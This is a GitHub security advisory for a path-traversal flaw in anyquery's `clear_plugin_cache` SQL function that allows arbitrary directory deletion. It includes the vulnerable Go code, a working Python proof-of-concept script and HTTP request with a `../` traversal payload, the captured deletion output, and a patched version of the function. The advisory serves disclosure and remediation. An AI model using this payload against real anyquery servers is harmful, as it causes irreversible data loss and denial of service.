# [H] Anyquery has Path Traversal through `clear_plugin_cache`, Allowing Arbitrary Directory Deletion

## Summary
Severity: High
Advisory: GHSA-j9rx-rppg-6hh4
CVE: CVE-2026-47253
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-j9rx-rppg-6hh4
Type: github-advisory

## Affected
- Go: `github.com/julien040/anyquery` — affected >=0 <0.4.5

## Details
# Path Traversal in `clear_plugin_cache` Allows Arbitrary Directory Deletion

| Field            | Value |
| ---------------- | ----- |
| Repository       | julien040/anyquery |
| Affected version | 0.4.4 |
| Vulnerability    | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory |
| Severity         | High |


## Summary

The SQL scalar function `clear_plugin_cache(plugin)` in `namespace/other_functions.go` passes the caller-supplied `plugin` argument directly to `path.Join` and then to `os.RemoveAll`, with only an empty-string check as a guard. Because `path.Join` silently resolves `..` segments, a low-privileged bearer-token holder can submit `SELECT clear_plugin_cache('../../../../tmp/target')` to the `/v1/query` HTTP endpoint and delete any directory reachable by the server process. In the verified scenario, a directory outside `$XDG_CACHE_HOME/anyquery/plugins/` was successfully deleted, confirming full path-traversal exploitation.

## Affected Code

`namespace/other_functions.go:46` — `pathlib.Join` resolves `..` segments in attacker-controlled `plugin`, producing a path outside the cache root

`namespace/other_functions.go:53` — `os.RemoveAll` unconditionally deletes the traversed path

```go
func clear_plugin_cache(plugin string) string {
	pathToRemove := pathlib.Join(xdg.CacheHome, "anyquery", "plugins", plugin)

	if plugin == "" {
		return "The plugin name is empty"
	}

	// Remove the directory
	err := os.RemoveAll(pathToRemove)
	if err != nil {
		return err.Error()
	}

	return ""
}
```

HTTP JSON `body.Query` → `executeQueryLLM` (`controller/llm.go:420-426`) → `shell.Run` → SQLite `clear_plugin_cache(plugin)` → `pathlib.Join(xdg.CacheHome, "anyquery", "plugins", plugin)` at `other_functions.go:46` → `os.RemoveAll` at `other_functions.go:53`

## Proof of Concept

**Prerequisites:**
- Docker installed
- Python 3 with `requests` package (`pip install requests`)

**Step 1 — Build and start the vulnerable service:**

```bash
docker build -f Dockerfile -t anyquery-vuln002 .
docker run --rm --name anyquery-vuln002 -p 127.0.0.1:8070:8070 anyquery-vuln002
```

**Step 2 — Run the PoC script (separate terminal):**

```bash
python3 poc.py
```

**poc.py:**

```python
#!/usr/bin/env python3
"""PoC reproduction script — julien040/anyquery / VULN-002

Prerequisites:
    - Docker image built: docker build -f Dockerfile -t anyquery-vuln002 .
    - Container running:  docker run --rm --name anyquery-vuln002 -p 127.0.0.1:8070:8070 anyquery-vuln002
    - Python packages: requests (stdlib subprocess also used)

How to run (from this report directory, after Dockerfile service is up):
    python3 poc.py

Expected on success:
    Final stdout line begins with `RESULT: PASS` confirming that the sentinel
    directory outside the cache root was deleted via clear_plugin_cache path traversal.
"""

import subprocess
import sys
import json
import requests

BASE_URL = "http://127.0.0.1:8070"
CONTAINER = "anyquery-vuln002"
# Traversal payload: XDG_CACHE_HOME=/root/.cache, so
# path.Join("/root/.cache","anyquery","plugins","../../../../tmp/poc_sentinel")
# resolves to /tmp/poc_sentinel (4 levels up escapes the cache root).
TRAVERSAL_PLUGIN = "../../../../tmp/poc_sentinel"
SENTINEL_PATH = "/tmp/poc_sentinel"
QUERY = f"SELECT clear_plugin_cache('{TRAVERSAL_PLUGIN}')"


def docker_exec(cmd):
    result = subprocess.run(
        ["docker", "exec", CONTAINER] + cmd,
        capture_output=True, text=True
    )
    return result.returncode, result.stdout, result.stderr


def sentinel_exists():
    rc, _, _ = docker_exec(["test", "-d", SENTINEL_PATH])
    return rc == 0


# Step 1: create sentinel inside container
print(f"[1] Creating sentinel directory {SENTINEL_PATH} inside container...")
rc, out, err = docker_exec(["mkdir", "-p", SENTINEL_PATH])
if rc != 0:
    sys.exit(f"RESULT: FAIL — could not create sentinel: {err}")
if not sentinel_exists():
    sys.exit("RESULT: FAIL — sentinel not present after mkdir")
print(f"    Sentinel created: {SENTINEL_PATH}")

# Step 2: confirm server is reachable
print("[2] Confirming server is reachable...")
try:
    r = requests.get(f"{BASE_URL}/list-tables", timeout=5)
    assert r.status_code == 200, f"unexpected status {r.status_code}"
    print(f"    GET /list-tables → HTTP {r.status_code} OK")
except Exception as e:
    sys.exit(f"RESULT: FAIL — server not reachable: {e}")

# Step 3: send traversal request
print("[3] Sending path-traversal payload via POST /execute-query...")
payload = {"query": QUERY}
r = requests.post(
    f"{BASE_URL}/execute-query",
    headers={"Content-Type": "application/json"},
    data=json.dumps(payload),
    timeout=10,
)
print(f"    HTTP {r.status_code}")
print(f"    Body: {r.text.strip()}")

if r.status_code != 200:
    sys.exit(f"RESULT: FAIL — unexpected HTTP status {r.status_code}")

# Step 4: verify sentinel is gone
print("[4] Checking whether sentinel was deleted inside container...")
if sentinel_exists():
    print(f"    Sentinel still present — traversal did not delete it.")
    print(f"RESULT: FAIL — {SENTINEL_PATH} still exists after traversal request")
else:
    print(f"    Sentinel GONE — {SENTINEL_PATH} deleted outside cache root.")
    print(f"RESULT: PASS — clear_plugin_cache('{TRAVERSAL_PLUGIN}') deleted {SENTINEL_PATH} (outside /root/.cache/anyquery/plugins/)")
```

**HTTP request:**

```http
POST /execute-query HTTP/1.1
Host: 127.0.0.1:8070
Content-Type: application/json

{"query": "SELECT clear_plugin_cache('../../../../tmp/poc_sentinel')"}
```

**Output:**

```text
[1] Creating sentinel directory /tmp/poc_sentinel inside container...
    Sentinel created: /tmp/poc_sentinel
[2] Confirming server is reachable...
    GET /list-tables → HTTP 200 OK
[3] Sending path-traversal payload via POST /execute-query...
    HTTP 200
    Body: +----------------------------------------------------+
| clear_plugin_cache('../../../../tmp/poc_sentinel') |
+----------------------------------------------------+
|                                                    |
+----------------------------------------------------+
1 results
[4] Checking whether sentinel was deleted inside container...
    Sentinel GONE — /tmp/poc_sentinel deleted outside cache root.
RESULT: PASS — clear_plugin_cache('../../../../tmp/poc_sentinel') deleted /tmp/poc_sentinel (outside /root/.cache/anyquery/plugins/)
```

## Impact

An authenticated low-privileged API user can delete any directory accessible to the anyquery server process by supplying a `..`-traversing plugin name to `clear_plugin_cache`. Verified impact is permanent deletion of arbitrary directories outside the intended plugin cache boundary (`$XDG_CACHE_HOME/anyquery/plugins/`). In a realistic deployment, an attacker could target configuration directories, application data, or the user's home directory, causing irreversible data loss and denial of service. There is no confidentiality impact as the function only deletes and does not read data.

## Remediation

In `namespace/other_functions.go`, resolve the full path and confirm it shares the expected cache-root prefix before calling `os.RemoveAll`:

```go
func clear_plugin_cache(plugin string) string {
    if plugin == "" {
        return "The plugin name is empty"
    }
    cacheRoot := pathlib.Join(xdg.CacheHome, "anyquery", "plugins")
    pathToRemove := pathlib.Join(cacheRoot, plugin)
    rel, err := filepath.Rel(cacheRoot, pathToRemove)
    if err != nil || strings.HasPrefix(rel, "..") || rel == ".." {
        return "Invalid plugin name"
    }
    if err := os.RemoveAll(pathToRemove); err != nil {
        return err.Error()
    }
    return ""
}
```

As a defence-in-depth measure, also reject `plugin` values containing `/`, `\`, or a leading `.` at the input level before the `path.Join` call, so traversal sequences are blocked at the earliest opportunity.

## References
- https://github.com/julien040/anyquery/security/advisories/GHSA-j9rx-rppg-6hh4
- https://github.com/julien040/anyquery
- https://github.com/julien040/anyquery/releases/tag/0.4.5
